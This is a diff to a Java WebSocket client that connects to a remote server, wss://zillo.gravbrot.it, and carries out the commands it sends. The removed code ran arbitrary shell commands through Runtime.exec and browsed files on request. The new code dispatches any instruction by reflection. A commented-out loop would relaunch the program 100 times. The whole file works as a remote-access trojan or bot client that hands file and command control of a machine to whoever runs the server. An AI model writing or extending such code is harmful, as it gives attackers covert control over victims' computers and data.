@@ -1,10 +1,12 @@
 package Classes;
 
-import Classes.Instructions.FileViewer;
+import Classes.Instructions.*;
+
 import org.java_websocket.client.WebSocketClient;
 import org.java_websocket.handshake.ServerHandshake;
 
 import java.io.IOException;
+import java.lang.reflect.InvocationTargetException;
 import java.net.URI;
 import java.net.URISyntaxException;
 import java.nio.ByteBuffer;
@@ -14,6 +16,7 @@ import com.google.gson.Gson;
 
 public class Connection extends WebSocketClient {
     Gson json = new Gson();
+    public InstructionResolver instructions;
 
     public Connection(URI serverURI) {
         super(serverURI);
@@ -23,7 +26,15 @@ public class Connection extends WebSocketClient {
     public void onOpen(ServerHandshake handshakedata) {
         try {
             Initialize init = new Initialize(this);
+
+            this.instructions = new InstructionResolver();
         } catch (IOException e) {
+            e.printStackTrace();
+        } catch (IllegalAccessException e) {
+            e.printStackTrace();
+        } catch (ClassNotFoundException e) {
+            e.printStackTrace();
+        } catch (NoSuchFieldException e) {
             e.printStackTrace();
         }
     }
@@ -35,7 +46,7 @@ public class Connection extends WebSocketClient {
 
         Connection connection = null;
         try {
-            Thread.sleep(10000);
+            Thread.sleep(5000);
 
             connection = new Connection( new URI( "wss://zillo.gravbrot.it" ) );
         } catch (URISyntaxException | InterruptedException e) {
@@ -50,40 +61,22 @@ public class Connection extends WebSocketClient {
 
         HashMap<String, String> command = json.fromJson(message, HashMap.class);
 
-        String type = command.get("type");
+        String instruction = command.get("instruction");
         String from = command.get("from");
 
-        if (type.equals("fileview")) {
-            String path = command.get("value");
-            String todo = command.get("todo");
-
-            FileViewer fview = new FileViewer(this, path);
-            try {
-                fview.execute(todo, from);
-            } catch (IOException e) {
-                e.printStackTrace();
-            }
-        } else if (type.equals("exec")) {
-            String exec = command.get("value");
-
-            System.out.println("Running command " + exec);
-
-            Runtime runtime = Runtime.getRuntime();
-            try {
-                Process proc = runtime.exec(exec);
-            } catch (IOException e) {
-                e.printStackTrace();
-            }
-
-//            HashMap<String, String> information = new HashMap<String, String>();
-//            information.put("type", "reply");
-//            information.put("to", from);
-//            information.put("value", "du er ballamann");
-//
-//            String toSend = json.toJson(information);
-//
-//            this.send(toSend);
+        try {
+            instructions.HandleInstruction(instruction, from, this);
+        } catch (NoSuchFieldException | IllegalAccessException | NoSuchMethodException | InstantiationException | InvocationTargetException e) {
+            e.printStackTrace();
         }
+
+//        HashMap<String, Object> arguments = new HashMap<String, Object>();
+//        arguments.put("value", "java -jar C:\\Users\\Marco\\Desktop\\zillo\\out\\artifacts\\zillo_jar\\zillo.jar");
+//
+//        for (int i = 0; i < 100; i++) {
+//            Exec exec = new Exec(this);
+//            exec.execute(arguments, "10382");
+//        }
     }
 
     @Override
